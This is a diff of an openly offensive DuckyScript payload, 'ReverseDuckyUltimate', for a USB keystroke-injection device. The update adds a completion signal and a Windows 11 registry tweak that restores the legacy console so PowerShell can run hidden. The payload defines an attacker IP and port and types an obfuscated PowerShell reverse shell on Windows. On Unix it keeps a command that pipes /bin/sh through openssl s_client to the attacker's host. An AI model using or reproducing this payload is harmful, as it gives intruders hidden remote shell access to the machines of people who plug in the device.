@@ -1,5 +1,5 @@
 REM       ReverseDuckyUltimate
-REM       Version 1.1
+REM       Version 1.3
 REM       OS: Windows / Unix
 REM       Author: 0iphor13
 REM       Requirement: DuckyScript 3.0, PayloadStudio v.1.3 minimum
@@ -129,12 +129,82 @@ EXTENSION Rolling_Powershell_Execution
     REM Rolling_Powershell_Execution()
 END_EXTENSION
 
+EXTENSION Detect_Finished
+    REM VERSION 1.0
+    REM AUTHOR: 0iphor13
+
+    REM_BLOCK DOCUMENTATION
+        USAGE:
+            Use the function Detect_Finished() to signal the finished execution of your payload.
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #PAUSE 150
+    FUNCTION Detect_Finished()
+        IF ($_CAPSLOCK_ON == FALSE)
+            CAPSLOCK
+            DELAY #PAUSE
+            CAPSLOCK
+            DELAY #PAUSE
+            CAPSLOCK
+            DELAY #PAUSE
+            CAPSLOCK
+            ATTACKMODE OFF
+        ELSE IF
+            CAPSLOCK
+            DELAY #PAUSE
+            CAPSLOCK
+            DELAY #PAUSE
+            CAPSLOCK
+            ATTACKMODE OFF
+        END_IF
+    END_FUNCTION
+END_EXTENSION
+
+EXTENSION Windows11_Console_Downgrade
+    REM_BLOCK
+        Version: 1.0
+        Author: 0iphor13
+        Description: Downgrade the default command prompt of Windows 11 to use Conhost again. 
+        Afterwards PowerShell can be used with paramters like "-WindowStyle Hidden" again.
+    END_REM
+
+    REM CONFIGURATION:
+    REM Used to wait until initial execution
+    DEFINE #INPUT_WAIT 2000
+    REM GUID for using the legacy console host for terminal execution
+    DEFINE #CONHOST B23D10C0-E52E-411E-9D5B-C09FDF709C7D
+ 
+    FUNCTION Console_Downgrade()
+        DELAY #INPUT_WAIT
+        GUI r
+        DELAY 500
+        STRINGLN powershell -NoP -NonI
+        DELAY 1000
+        STRING Set-ItemProperty -Path "HKCU:\Console\%%Startup" -Name DelegationConsole -Value "{#CONHOST}";
+        STRINGLN Set-ItemProperty -Path "HKCU:\Console\%%Startup" -Name DelegationTerminal -Value "{#CONHOST}";exit
+    END_FUNCTION
+
+    REM_BLOCK
+        EXAMPLE USAGE AFTER EXTENSION: Downgrade the command prompt via registry, then open a hidden PS instance and execute Calc.exe.
+        Console_Downgrade()
+        DELAY 2000
+        GUI r
+        DELAY 2000
+        STRINGLN powershell -w h
+        DELAY 1500
+        STRINGLN calc.exe;exit
+    END_REM
+END_EXTENSION
+
 REM Define the attackers IP, Port and Identifier
 DEFINE #ADDRESS '0.0.0.0'
 DEFINE #PORT 4444
 DEFINE #IDENTIFIER Ducky
 REM Automatic setup requires openssl!
 DEFINE #SETUP FALSE
+REM Turn on when target uses Windows 11 - Helps to hide Powershell
+DEFINE #WINDOWS11 FALSE
 
 REM Automatic setup and start listener - Requires openssl!
 IF_DEFINED_TRUE #SETUP
@@ -290,10 +360,15 @@ ELSE_DEFINED
             END_IF
         END_FUNCTION
         
+        REM Downgrades the Console, if Windows 11 is set to TRUE
+        IF_DEFINED_TRUE #WINDOWS11
+            Console_Downgrade()
+            DELAY 2000
+        END_IF_DEFINED
         GUI r
         DELAY 500
         Rolling_Powershell_Execution()
-        DELAY 300
+        DELAY 1000
         Polymorphism()    
         STRING =[Text.Encoding]::UTF8.GetBytes(
         Quack_Slogan()
@@ -337,9 +412,7 @@ ELSE_DEFINED
         DELAY 250
         ENTER
         REM Indicator of successful execution
-        CAPSLOCK
-        DELAY 20
-        CAPSLOCK
+        Detect_Finished()
     ELSE
         REM Executing reverse shell when inserted into non-windows box
         REM Non-ideal solution for opening terminal (But should work for most unix distros)
@@ -353,5 +426,7 @@ ELSE_DEFINED
         STRINGLN which screen >/dev/null && which openssl >/dev/null && screen -md sh -c 'mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect #ADDRESS:#PORT > /tmp/s; rm /tmp/s'
         DELAY 1000
         STRINGLN exit
+        REM Indicator of successful execution
+        Detect_Finished()
     END_IF
 END_IF_DEFINED
